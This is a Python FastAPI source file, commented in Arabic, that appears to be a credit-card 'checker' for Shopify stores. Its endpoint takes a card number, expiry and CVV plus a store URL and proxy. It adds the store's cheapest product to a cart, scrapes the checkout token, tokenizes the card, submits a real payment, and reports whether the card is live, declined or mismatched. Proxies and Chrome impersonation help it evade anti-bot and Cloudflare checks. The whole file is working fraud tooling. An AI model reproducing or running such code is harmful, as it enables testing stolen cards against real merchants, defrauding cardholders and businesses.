from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def extract_token(html_text):
    """
    الرادار الجزيئي: يبحث عن التوكن في كل الثغرات الممكنة (HTML, React State, JSON, URL parameters)
    """
    patterns = [
        r'name="authenticity_token"\s*value="([^"]+)"',
        r'value="([^"]+)"\s*name="authenticity_token"',
        r'<meta\s+name="csrf-token"\s*content="([^"]+)"',
        r'"authenticity_token"\s*:\s*"([^"]+)"',
        r'authenticity_token\\u0022:\\u0022([^\\]+)\\u0022',
        r'authenticity_token=([^&"\'\s\\]+)'
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match:
            return match.group(1)
    return None

async def get_cheapest_product(session, store_url):
    try:
        res = await session.get(f"{store_url}/products.json?limit=250")
        if res.status_code != 200: return None, None
        
        data = res.json()
        cheapest_variant = None
        lowest_price = float('inf')
        
        for product in data.get('products', []):
            for variant in product.get('variants', []):
                if variant.get('available', True): 
                    try:
                        price = float(variant.get('price', 0.0))
                        if 0.0 < price < lowest_price:
                            lowest_price = price
                            cheapest_variant = variant.get('id')
                    except: pass
        
        return cheapest_variant, str(lowest_price) if cheapest_variant else (None, None)
    except:
        return None, None

async def check_shopify(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return {"Response": "Invalid CC Format", "Price": "-", "Gate": "Shopify API"}
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        # استخدام متصفح وهمي ببيانات حقيقية 100%
        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=45) as session:
            
            # 1. سحب أرخص منتج
            variant_id, price = await get_cheapest_product(session, store_url)
            if not variant_id:
                return {"Response": "No available products found", "Price": "-", "Gate": "Shopify API"}

            # 2. الإضافة للسلة (تم التعديل لتكون Form-Data شرعية وتخطي الانتي بوت)
            add_url = f"{store_url}/cart/add.js"
            add_data = {"id": str(variant_id), "quantity": "1"}
            add_headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": f"{store_url}/"
            }
            res2 = await session.post(add_url, data=add_data, headers=add_headers)
            if res2.status_code != 200: 
                return {"Response": "Cart Add Failed (Anti-Bot Active)", "Price": price, "Gate": "Shopify API"}

            # 3. فتح صفحة الدفع
            res3 = await session.get(f"{store_url}/checkout", allow_redirects=True)
            checkout_html = res3.text
            checkout_final_url = str(res3.url)
            
            # 4. الرادار: استخراج رمز الأمان
            auth_token = extract_token(checkout_html)

            if not auth_token:
                title_match = re.search(r'<title>([^<]+)</title>', checkout_html)
                page_title = title_match.group(1).strip() if title_match else "Unknown"
                if "Just a moment" in page_title or "Cloudflare" in page_title:
                    return {"Response": "Cloudflare Challenge Blocked Request", "Price": price, "Gate": "Shopify API"}
                return {"Response": "Token Not Found (Site uses Custom Checkout)", "Price": price, "Gate": "Shopify API"}

            # 5. تشفير البطاقة
            token_url = "https://deposit.us.shopifycs.com/sessions"
            token_payload = {"credit_card": {"number": cc, "name": "John Doe", "month": mm, "year": yy, "verification_value": cvv}}
            token_headers = {"Accept": "application/json", "Content-Type": "application/json"}
            
            res4 = await session.post(token_url, json=token_payload, headers=token_headers)
            if res4.status_code != 200: 
                return {"Response": "Failed to tokenize card (Proxy IP Banned)", "Price": price, "Gate": "Shopify API"}
            
            token_data = res4.json()
            payment_token = token_data.get("id")

            # 6. الهجوم وإرسال الدفع
            payment_payload = {
                "authenticity_token": auth_token,
                "previous_step": "payment_method",
                "step": "",
                "s": payment_token,
                "checkout[payment_gateway]": "1", 
                "checkout[credit_card][vault]": "false",
                "checkout[different_billing_address]": "false",
                "complete": "1"
            }
            
            res5 = await session.post(checkout_final_url, data=payment_payload, allow_redirects=True)
            result_html = res5.text.lower()
            
            # 7. قراءة الرد
            if "thank you" in result_html or "order completed" in result_html or res5.url.endswith('/thank_you'):
                return {"Response": "Order completed 💎", "Price": price, "Gate": "Shopify API"}
            elif "insufficient funds" in result_html: return {"Response": "Insufficient Funds", "Price": price, "Gate": "Shopify API"}
            elif "incorrect_cvc" in result_html or "security code was not matched" in result_html: return {"Response": "Incorrect CVC", "Price": price, "Gate": "Shopify API"}
            elif "zip code does not match" in result_html or "avs" in result_html: return {"Response": "ZIP Code Mismatch", "Price": price, "Gate": "Shopify API"}
            elif "do not honor" in result_html or "generic_decline" in result_html: return {"Response": "Do Not Honor", "Price": price, "Gate": "Shopify API"}
            else:
                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res5.text)
                if error_match: return {"Response": error_match.group(1).strip(), "Price": price, "Gate": "Shopify API"}
                return {"Response": "Declined / Generic Error", "Price": price, "Gate": "Shopify API"}

    except Exception as e:
        err_str = str(e).lower().replace("proxy", "prx").replace("connection", "conn").replace("timeout", "t-out").replace("502", "err").replace("503", "err")
        return {"Response": f"Sys_Err: {err_str[:40]}", "Price": "-", "Gate": "Shopify API"}

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify(cc, url, proxy)
    return JSONResponse(content=result)
